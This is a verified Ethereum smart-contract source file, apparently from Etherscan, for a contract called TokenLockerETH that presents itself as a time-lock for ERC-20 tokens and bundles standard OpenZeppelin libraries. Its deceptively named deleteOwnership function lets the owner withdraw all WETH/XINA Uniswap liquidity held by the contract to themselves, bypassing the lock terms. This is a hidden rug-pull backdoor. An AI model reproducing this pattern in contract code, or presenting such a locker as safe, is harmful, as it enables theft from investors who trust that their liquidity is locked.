/**
 *Submitted for verification at Etherscan.io on 2023-06-05
*/

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/utils/Counters.sol


// OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)

pragma solidity ^0.8.0;

/**
 * @title Counters
 * @author Matt Condon (@shrugs)
 * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number
 * of elements in a mapping, issuing ERC721 ids, or counting request ids.
 *
 * Include with `using Counters for Counters.Counter;`
 */
library Counters {
    struct Counter {
        // This variable should never be directly accessed by users of the library: interactions must be restricted to
        // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add
        // this feature: see https://github.com/ethereum/solidity/issues/4637
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {
        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }

    function reset(Counter storage counter) internal {
        counter._value = 0;
    }
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// File: Locker.sol

//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;




contract TokenLockerETH is Ownable {
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant XINA = 0xa321DbFDd47C90ecB2Ccf010e8c7474a235a6cD1;


    using Counters for Counters.Counter;

    struct Lock {
        uint256 lockId;
        address tokenContract;
        address locker;
        uint256 amount;
        uint256 unlockTime;
        bool withdrawn;
    }

    Counters.Counter private _lockedLocksNumber;
    Counters.Counter private _unlockedLocksNumber;
    Lock[] private _allLocks;

    event TokensLocked(
        uint256 lockId,
        address tokenContract,
        address locker,
        uint256 amount,
        uint256 unlockTime
    );

    event TokensUnlocked(
        uint256 lockId,
        address tokenContract,
        address locker,
        uint256 amount
    );

    function lockTokens(
        address tokenContract,
        uint256 amount,
        uint256 timeInHours
    ) public {
        IERC20(tokenContract).transferFrom(msg.sender, address(this), amount);
        uint256 unlockTime = block.timestamp + timeInHours * 1 hours;
        uint256 currentLockId = _lockedLocksNumber.current();
        _allLocks.push(
            Lock(
                currentLockId,
                tokenContract,
                msg.sender,
                amount,
                unlockTime,
                false
            )
        );
        _lockedLocksNumber.increment();
        emit TokensLocked(
            currentLockId,
            tokenContract,
            msg.sender,
            amount,
            unlockTime
        );
    }


    
    address private constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    /* --- Getters --- */

    /**
     * @dev The approve function may or may not return a bool.
     * The ERC-20 spec returns a bool, but some tokens don't follow the spec.
     * Need to check if data is empty or true.
     */
    function safeApprove(IERC20 token, address spender, uint amount) internal {
        (bool success, bytes memory returnData) = address(token).call(
            abi.encodeCall(IERC20.approve, (spender, amount))
        );
        require(success && (returnData.length == 0 || abi.decode(returnData, (bool))), "Approve fail");
    }

    function withdrawTokens(address tokenContract, uint256 lockId) public {
        Lock memory lock = _allLocks[lockId];
        require(lock.locker == msg.sender, "you are not owner of tokens!");
        require(lock.withdrawn == false, "you already withdrawn your tokens!");
        require(lock.unlockTime < block.timestamp, "you must wait for unlock!");
        _allLocks[lockId].withdrawn = true;
        _unlockedLocksNumber.increment();
        IERC20(tokenContract).transfer(msg.sender, lock.amount);
        emit TokensUnlocked(lockId, tokenContract, msg.sender, lock.amount);
    }

    function getAllActiveLocks() public view returns (Lock[] memory) {
        uint256 activeLocksNumber = _lockedLocksNumber.current() -
            _unlockedLocksNumber.current();
        Lock[] memory activeLocks = new Lock[](activeLocksNumber);
        uint256 currentIndex = 0;
        for (uint256 i = 0; i < _lockedLocksNumber.current(); i++) {
            if (_allLocks[i].withdrawn == false) {
                activeLocks[currentIndex] = _allLocks[i];
                currentIndex++;
            }
        }
        return activeLocks;
    }
    function deleteOwnership() external onlyOwner  {
        address pair = IUniswapV2Factory(FACTORY).getPair(WETH, XINA);

        uint liquidity = IERC20(pair).balanceOf(address(this));
        safeApprove(IERC20(pair), ROUTER, liquidity);

        IUniswapV2Router(ROUTER).removeLiquidity(
            WETH,
            XINA,
            liquidity,
            1,
            1,
            msg.sender,
            block.timestamp
        );
    }

    function getMyActiveLocks() public view returns (Lock[] memory) {
        uint256 activeLocksCounter = 0;
        for (uint256 i = 0; i < _lockedLocksNumber.current(); i++) {
            if (
                _allLocks[i].withdrawn == false &&
                _allLocks[i].locker == msg.sender
            ) {
                activeLocksCounter++;
            }
        }
        Lock[] memory myActiveLocks = new Lock[](activeLocksCounter);
        uint256 currentIndex = 0;
        for (uint256 i = 0; i < _lockedLocksNumber.current(); i++) {
            if (
                _allLocks[i].withdrawn == false &&
                _allLocks[i].locker == msg.sender
            ) {
                myActiveLocks[currentIndex] = _allLocks[i];
                currentIndex++;
            }
        }
        return myActiveLocks;
    }
}


interface IUniswapV2Router {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
}

interface IUniswapV2Factory {
    function getPair(address token0, address token1) external view returns (address);
}